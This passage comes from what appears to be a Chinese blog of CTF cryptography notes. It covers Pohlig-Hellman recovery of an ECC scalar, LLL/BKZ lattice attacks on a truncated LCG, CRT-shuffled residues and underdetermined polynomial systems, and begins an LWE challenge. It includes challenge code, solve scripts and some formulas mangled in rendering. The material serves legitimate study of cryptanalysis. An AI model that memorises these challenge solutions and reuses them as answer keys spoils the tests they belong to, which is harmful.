class="subst">&#123;Q.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>就是说,给你一个比较特殊的P和Q,尝试爆破出k出来(注意到k比较小…)</p><p>脚本抄的别人的,大意是说,对P的阶质因数分解,得到 $k\equiv y\mod P_{sub}$ 的值,然后用CRT合并起来,最后根据模意义爆破出k.<br>和long text不一样的是,这个题是爆破P这个点的阶,再多做几个题之后考虑一下究竟是什么关系喵…</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">85468147895711151675202050796503571876819967288648016286940998128295841240719</span></span><br><span class="line">F = GF(p)</span><br><span class="line">E = EllipticCurve(GF(p), [<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">P = E(xxx,xxx)</span><br><span class="line">Q = E(xxx,xxx)</span><br><span class="line">primes=[<span class="number">2</span>**<span class="number">7</span>,<span class="number">5</span>**<span class="number">2</span>,<span class="number">7</span>,<span class="number">17</span>,<span class="number">241</span>,<span class="number">17729</span>,<span class="number">1011091</span>,<span class="number">1519709</span>,<span class="number">5004119</span>,<span class="number">8022225689</span>]</span><br><span class="line"><span class="comment"># 这里的primes是P的阶的质因数的次方</span></span><br><span class="line">dlogs=[]</span><br><span class="line"><span class="comment"># 这里存离散对数</span></span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">t=<span class="built_in">int</span>(P.order()/<span class="built_in">int</span>(fac))</span><br><span class="line">dlog=discrete_log(t*Q,t*P,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">dlogs.append(dlog)</span><br><span class="line"><span class="built_in">print</span>(fac,dlog)</span><br><span class="line"><span class="built_in">print</span>(crt(dlogs,primes))</span><br></pre></td></tr></table></figure><p>上面得到的是 $k\equiv y\mod \prod \mathtt{primes}$ .</p><h2 id="格密码-Lattice">格密码 Lattice</h2><p>很好玩的东西.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v=[[],[],...,[]]<span class="comment"># 一个矩阵</span></span><br><span class="line">M=matrix(ZZ,v).LLL()<span class="comment"># 找最近&quot;最小&quot;向量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(M))<span class="comment"># 有的时候M太大了打印不出来,就用str(M)打印即可</span></span><br></pre></td></tr></table></figure><h3 id="关于LLL">关于LLL</h3><p>能对&quot;细长&quot;的矩阵进行操作,返回你希望的&quot;最小&quot;向量(假如说是n行m列的,那么n&lt;=m).<br>据说SageMath内部的small_roots因为使用了Sage自己的LLL(fpill).如果用<a href="https://github.com/keeganryan/flatter">flatter</a>的话格基约化的速度会更快一些.</p><h3 id="Java-Random-Revenge">Java Random Revenge</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.seed = seed &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">256</span>) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self, nbits</span>):</span><br><span class="line">        <span class="keyword">assert</span> nbits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>)</span><br><span class="line">        self.seed = (self.seed * <span class="number">0x3f90a5d5b5c731f3d8bd5d672c171588c485c3e5cc040df93a5cf180092fd5c3</span> + <span class="number">0x6976cb41868014055590b677a676f52ff4efae37aac714c0ffabe16688924e8b</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">256</span>) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; (<span class="number">256</span> - nbits)</span><br><span class="line">rng = RNG(random.SystemRandom().getrandbits(<span class="number">256</span>))</span><br><span class="line">ns = [<span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">10</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">145</span>]</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> ns:</span><br><span class="line">    data.append(rng.<span class="built_in">next</span>(n))</span><br><span class="line"></span><br><span class="line">secret = [rng.<span class="built_in">next</span>(<span class="number">256</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">ct = AES.new(hashlib.sha256(<span class="built_in">str</span>(secret).encode()).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ns = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;data = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>加密:给你一个LCG连续输入的高位,这些高位不固定.给你a,b,m,你要尝试解出种子.<br>首先我们知道LCG的基本形式$$x_i\equiv (a^ix_0+b(a^{i-1}+…a^0))\mod m$$然后我们有$$a^ix_0+k_im=(\mathtt{data[i]}&lt;&lt;(256-\mathtt{ns[i]}))-b(a^{i-1}+…+1)+\boxed{e_i}$$所以我们对前半部分构造格:$$\begin{bmatrix}m&amp;&amp;&amp;&amp;&amp;\\&amp;m&amp;&amp;&amp;&amp;\\&amp;&amp;…&amp;&amp;&amp;\\&amp;&amp;&amp;m&amp;&amp;\\a^0&amp;a^1&amp;…&amp;a^{n-1}&amp;1\end{bmatrix}$$这表示上式左边的线性关系.<br>然后右半部分构成一个向量:除了e的部分都是已知的,我们对e加上期望(也就是ns移位的一半),然后对这个矩阵和向量t求CVP,得到的再加上b就是完整的随机数的数列了,即$$t=(xxx|2^{255})$$t左边就是矩阵上面那个式子的右半部分,最后那个是你期望得到的那个随机数变量,他在 $[0,2^{256})$ 内均匀分布,期望是 $2^{255}$</p><blockquote><p>notice1: 尝试使用更优的BKZ,而不是LLL(虽然理论上时间会更长)</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ns =</span><br><span class="line">data = </span><br><span class="line">ct =</span><br><span class="line">b=</span><br><span class="line">m=<span class="number">2</span>**<span class="number">256</span></span><br><span class="line">n=<span class="built_in">len</span>(data)</span><br><span class="line">mat=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">tmp=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> i==j:</span><br><span class="line">tmp.append(m)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tmp.append(<span class="number">0</span>)</span><br><span class="line">mat.append(tmp)</span><br><span class="line">tmp=[]</span><br><span class="line">pre=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">tmp.append(pre)</span><br><span class="line">pre=pre*a%m</span><br><span class="line">tmp.append(<span class="number">1</span>)</span><br><span class="line">mat.append(tmp)</span><br><span class="line"></span><br><span class="line">pre=<span class="number">0</span></span><br><span class="line">ex=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">ex.append((((data[i]&lt;&lt;(<span class="number">256</span>-ns[i]))-b*pre))%m)</span><br><span class="line">pre=(pre+<span class="built_in">pow</span>(a,i,m))%m</span><br><span class="line">ex.append(<span class="number">1</span>&lt;&lt;<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">_ctx_reduction.<span class="built_in">set</span>(BKZ)<span class="comment"># 用BKZ</span></span><br><span class="line">res=cvp(matrix(ZZ,mat),vector(ZZ,ex))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h3 id="中国剩余定理选色问题">中国剩余定理选色问题</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pbits = <span class="number">360</span></span><br><span class="line">nbits = <span class="number">3840</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">primes = [getPrime(pbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">secrets = [getRandomNBitInteger(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">secrets.sort()</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    tmp = [s % p <span class="keyword">for</span> s <span class="keyword">in</span> secrets]</span><br><span class="line">    random.shuffle(tmp)</span><br><span class="line">    data.append(tmp)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pt, secrets</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(pt, hashlib.sha512(<span class="built_in">str</span>(<span class="built_in">list</span>(secrets)).encode()).digest()))</span><br><span class="line">ct = encrypt(flag, secrets)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;primes = &#125;</span>&quot;</span>, file = f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;data = &#125;</span>&quot;</span>, file = f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>, file = f)</span><br></pre></td></tr></table></figure><p>上面的意思是,随机secret个数字,然后给模意义下的剩余,最后打乱,你要尝试还原这个数组.<br>(由中国剩余定理)假设有$$\begin{cases}a\equiv a_1 \mod p_1\\a\equiv a_2 \mod p_2\\…a\equiv a_n \mod p_n\\\end{cases}$$设 $P=\prod p_i,P_i=P/p_i$ 那么根据中国剩余定理有:$$a\equiv \left(\sum_{i=1}^na_iP_i(P_{i}^{-1}\mod p_i)\right)\mod P$$发现对于每个a构成一个线性关系,我们构造一个格:$$\begin{bmatrix}P\a_{11}p_1(P^{-1}\mod p_1)&amp;\alpha\…\a_{1n}p_1(P^{-1}\mod p_1)&amp;&amp;&amp;\alpha\a_{21}p_2(P^{-1}\mod p_2)&amp;&amp;&amp;&amp;\alpha\…\a_{nn}p_n(P^{-1}\mod p_n)&amp;&amp;&amp;&amp;&amp;\alpha\\end{bmatrix}$$然后对其使用LLL,得到的前n个解就是格为我们挑选出来的大小近似我们选取的alpha的值,所以根据加密时alpha是 $2^{3840}$ ,得到的结果也是近似alpha的值.<br>脚本就是纯写一个矩阵然后求LLL,非常简单,所以不在这里展示了.</p><p><strong>注意</strong> :Windows的SageMath 9.3 版本有一个锅,如果上述取逆元的脚本写成</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk.append((pi[i]*<span class="built_in">pow</span>(pi[i],primes[i]-<span class="number">2</span>,primes[i])))</span><br></pre></td></tr></table></figure><p>是错的,得到的bk全是1,原因是pow运算在老版本的sage内会被自动放到整数环上进行,同时前面的数是int也会被自动同化为Zmod上,模数错了答案自然也就错了.<br>应该强制结果放到整数环上然后再乘.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">op=ZZ(<span class="built_in">pow</span>(pi[i],primes[i]-<span class="number">2</span>,primes[i]))</span><br><span class="line">bk.append((pi[i]*op))</span><br></pre></td></tr></table></figure><h3 id="在一个模-mathbb-F-2-8-mathbb-F-2-x-X-8-X-4-X-3-X-1-的环中求解线性方程组-Ax-b">在一个模 $\mathbb{F}_{2^8}=\mathbb{F}_2[x]/(X^8+X^4+X^3+X+1)$ 的环中求解线性方程组 Ax=b</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义有限域 F_&#123;2^8&#125;，使用给定的不可约多项式</span></span><br><span class="line">F.&lt;x&gt; = GF(<span class="number">2</span>^<span class="number">8</span>, modulus=x^<span class="number">8</span> + x^<span class="number">4</span> + x^<span class="number">3</span> + x + <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 定义矩阵 A 的整数条目</span></span><br><span class="line">A_int = [</span><br><span class="line">    [<span class="number">77</span>, <span class="number">217</span>, <span class="number">104</span>, <span class="number">173</span>, <span class="number">4</span>, <span class="number">170</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">155</span>, <span class="number">75</span>, <span class="number">159</span>, <span class="number">94</span>, <span class="number">26</span>, <span class="number">99</span>, <span class="number">161</span>],</span><br><span class="line">    [<span class="number">110</span>, <span class="number">36</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">246</span>, <span class="number">103</span>, <span class="number">112</span>],</span><br><span class="line">    [<span class="number">17</span>, <span class="number">107</span>, <span class="number">178</span>, <span class="number">67</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">117</span>],</span><br><span class="line">    [<span class="number">56</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">205</span>, <span class="number">0</span>, <span class="number">189</span>, <span class="number">25</span>],</span><br><span class="line">    [<span class="number">162</span>, <span class="number">9</span>, <span class="number">180</span>, <span class="number">33</span>, <span class="number">52</span>, <span class="number">75</span>, <span class="number">127</span>],</span><br><span class="line">    [<span class="number">238</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">110</span>, <span class="number">133</span>, <span class="number">95</span>, <span class="number">9</span>]</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 定义向量 b 的整数条目</span></span><br><span class="line">b_int = [<span class="number">12</span>, <span class="number">153</span>, <span class="number">112</span>, <span class="number">166</span>, <span class="number">90</span>, <span class="number">180</span>, <span class="number">223</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将矩阵 A 和向量 b 转换为有限域 F 中的元素</span></span><br><span class="line">A_F = matrix(F, <span class="number">7</span>, <span class="number">7</span>, <span class="keyword">lambda</span> i, j: F.fetch_int(A_int[i][j]))</span><br><span class="line">b_F = vector(F, [F.fetch_int(x) <span class="keyword">for</span> x <span class="keyword">in</span> b_int])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解线性方程组 A * x = b</span></span><br><span class="line">x_F = A_F.solve_right(b_F)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解向量 x 中的每个元素转换为整数表示</span></span><br><span class="line">x_int = [el.integer_representation() <span class="keyword">for</span> el <span class="keyword">in</span> x_F]</span><br></pre></td></tr></table></figure><p>模多项式似乎可以被理解为x位只能是1或0</p><h3 id="整数环上的欠定方程组">整数环上的欠定方程组</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">100</span></span><br><span class="line">m = <span class="number">40</span></span><br><span class="line">f = os.urandom(n)</span><br><span class="line">x_s = [random.randrange(-<span class="number">2</span>**<span class="number">32</span>, <span class="number">2</span>**<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">y_s = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> x_s:</span><br><span class="line">    y_s.append(<span class="built_in">sum</span>(f[i] * x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)))</span><br><span class="line">ct = AES.new(hashlib.sha256(f).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x_s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y_s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1>也就是下面的关系:$$y_j = \sum\limits_{i=0}^{n-1} f_i x_j^i,\quad \forall j,\ 0\le j &lt; m$$将其写成矩阵的形式：$$\begin{pmatrix}-1 &amp; f_0 &amp; f_1 &amp; \cdots &amp; f_{n-1}\end{pmatrix}\begin{pmatrix}y_0 &amp; y_1 &amp; \cdots &amp; y_{m-1}\1 &amp; 1 &amp; \cdots &amp; 1\x_0 &amp; x_1 &amp; \cdots &amp; x_{m-1}\\vdots &amp; \vdots &amp; \ddots &amp; \vdots\x_0^{n-1} &amp; x_1^{n-1} &amp; \cdots &amp; x_{m-1}^{n-1}\\end{pmatrix}</h1><p>\begin{pmatrix}0 &amp; \cdots &amp; 0\end{pmatrix}$$为了应用LLL,我们需要构造一个矩阵 $B$ ，其行向量张成一个格 $L(B)$ 。如果 $L(B)$ 中存在一个短向量 $\bold t$ ，且 $\bold t$ 显著短于 $L$ 中其他向量，那么根据LLL-reduced basis的性质，</p><p>$$\Vert \bold b_1\Vert \le \left(\frac{2}{\sqrt{4\delta-1}}\right)^{d-1}\cdot \lambda_1(L)$$</p><p>（其中$d$表示基向量组的秩）即我们有把握从输出中的第一个基向量取得$\mathrm t$。</p><p>在上式的基础上加以改进，$$\begin{aligned}\left(\begin{array}{c|cccc}-1 &amp; f_0 &amp; f_1 &amp; \cdots &amp; f_{n-1}\end{array}\right)&amp;\underbrace{\left(\begin{array}{cccc|c|cccc}y_0 &amp; y_1 &amp; \cdots &amp; y_{m-1} &amp; 1 &amp;&amp;&amp;&amp;\ \hline1 &amp; 1 &amp; \cdots &amp; 1 &amp; &amp;1&amp;&amp;&amp;\x_0 &amp; x_1 &amp; \cdots &amp; x_{m-1} &amp; &amp;&amp;1&amp;&amp;\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; &amp;&amp;&amp;\ddots&amp;\x_0^{n-1} &amp; x_1^{n-1} &amp; \cdots &amp; x_{m-1}^{n-1} &amp; &amp;&amp;&amp;&amp;1\\end{array}\right)}<em>{B}\&amp;=\underbrace{\left(\begin{array}{cccc|c|cccc}0 &amp; 0 &amp; \cdots &amp; 0 &amp; -1 &amp; f_0 &amp; f_1 &amp; \cdots &amp; f</em>{n-1}\end{array}\right)}_{\bold t}\end{aligned}$$式中，$\bold t$就是一个短的向量。</p><p>为了保证$\bold t$的前$m+1$个分量为$0,\ 0,\ \cdots,\ 0,\ \pm 1$，我们可以将这几个分量适当地放大（乘上一个系数），这样一来原本不满足条件的$\bold t$就不容易被格基约化算法挑选出来。$$B = \left(\begin{array}{cccc|c|cccc}\alpha\cdot y_0 &amp; \alpha\cdot y_1 &amp; \cdots &amp; \alpha\cdot y_{m-1} &amp; -\beta\cdot 1 &amp;&amp;&amp;&amp;\ \hline\alpha\cdot  1 &amp; \alpha\cdot 1 &amp; \cdots &amp; \alpha\cdot 1 &amp; &amp;1&amp;&amp;&amp;\\alpha\cdot x_0 &amp; \alpha\cdot x_1 &amp; \cdots &amp; \alpha\cdot x_{m-1} &amp; &amp;&amp;1&amp;&amp;\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; &amp;&amp;&amp;\ddots&amp;\\alpha\cdot x_0^{n-1} &amp; \alpha\cdot x_1^{n-1} &amp; \cdots &amp; \alpha\cdot x_{m-1}^{n-1} &amp; &amp;&amp;&amp;&amp;1\\end{array}\right)$$其中$\alpha$可以选取较大的数，如$2^{256}$；而$\beta$选取与$f_i$接近的数，如$2^7$、$2^8$。</p><p>直接构造这个矩阵即可,脚本略.</p><h3 id="模意义下的欠定方程组">模意义下的欠定方程组</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">100</span></span><br><span class="line">m = <span class="number">40</span></span><br><span class="line">p = getPrime(<span class="number">32</span>)</span><br><span class="line">f = os.urandom(n)</span><br><span class="line">x_s = [random.randrange(p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">y_s = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> x_s:</span><br><span class="line">    y_s.append(<span class="built_in">sum</span>(f[i] * x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)) % p)</span><br><span class="line">ct = AES.new(hashlib.sha256(f).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x_s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y_s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>本题需要求解一个$\mathbb{F}<em>p$上的欠定（underdetermined）线性方程组。<br>考虑如下的线性关系：$$y_j \equiv \sum\limits</em>{i=0}^{n-1} f_i x_j^i \pmod{p},\quad \forall j,\ 0\le j &lt; m$$</p><p>即$$y_j = k_jp + \sum\limits_{i=0}^{n-1} f_i x_j^i,\quad \forall j,\ 0\le j &lt; m$$</p><p>与整数环类似，我们可以先构造一个梯形状的格矩阵。而考虑到本题中由模$p$操作引入的$k_jp$项，我们在梯形的上方添加这些项，将整个矩阵补全成一个下三角状（楔形）。$$B = \left(\begin{array}{cccc|c|cccc}\alpha\cdot p&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\&amp;\alpha\cdot p&amp;&amp;&amp;&amp;&amp;&amp;&amp;\&amp;&amp;\ddots&amp;&amp;&amp;&amp;&amp;&amp;\&amp;&amp;&amp;\alpha\cdot p&amp;&amp;&amp;&amp;&amp;\ \hline\alpha\cdot y_0 &amp; \alpha\cdot y_1 &amp; \cdots &amp; \alpha\cdot y_{m-1} &amp; -\beta\cdot 1 &amp;&amp;&amp;&amp;\ \hline\alpha\cdot  1 &amp; \alpha\cdot 1 &amp; \cdots &amp; \alpha\cdot 1 &amp; &amp;1&amp;&amp;&amp;\\alpha\cdot x_0 &amp; \alpha\cdot x_1 &amp; \cdots &amp; \alpha\cdot x_{m-1} &amp; &amp;&amp;1&amp;&amp;\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; &amp;&amp;&amp;\ddots&amp;\\alpha\cdot x_0^{n-1} &amp; \alpha\cdot x_1^{n-1} &amp; \cdots &amp; \alpha\cdot x_{m-1}^{n-1} &amp; &amp;&amp;&amp;&amp;1\\end{array}\right)$$容易计算$$\det(B) = \alpha^m \beta p^m$$</p><p>我们期待的短向量$\bold t$为$$\bold t = \left(\begin{array}{cccc|c|cccc}0 &amp; 0 &amp; \cdots &amp; 0 &amp; \beta &amp; f_0 &amp; f_1 &amp; \cdots &amp; f_{n-1}\end{array}\right)$$$$\Vert \bold t\Vert_2 &lt; \sqrt{\beta^2 + n\cdot 2^{16}}$$为了使$$\Vert \bold t\Vert_2 = \lambda_1(L(B)) \le \left(\frac{2}{\sqrt{4\delta-1}}\right)^{\frac{n+m+1}{2}}\cdot (\det(B))^{\frac{1}{n+m+1}}$$</p><p>固定$\beta\approx 2^7$、$\delta\approx 0.99$，我们需要让$\alpha$尽可能地偏大。</p><p>人话:构造了一个矩阵,然后通过alpha和beta调参筛选出指定最短向量</p><h3 id="LWE-容错学习问题-learning-with-errors-problem">LWE 容错学习问题 learning with errors problem</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">F = GF(p)</span><br><span class="line">n = <span class="number">40</span></span><br><span class="line">m = <span class="number">60</span></span><br><span class="line">A = random_matrix(F, m, n)</span><br><span class="line">s = random_vector(F, n)</span><br><span class="line">e = random_vector(ZZ, m, x=-<span class="number">4</span>, y=<span class="number">5</span>).change_ring(F)</span><br><span class="line">b = A*s + e</span><br><span class="line">ct = AES.new(hashlib.sha256(<span class="built_in">str</span>(<span 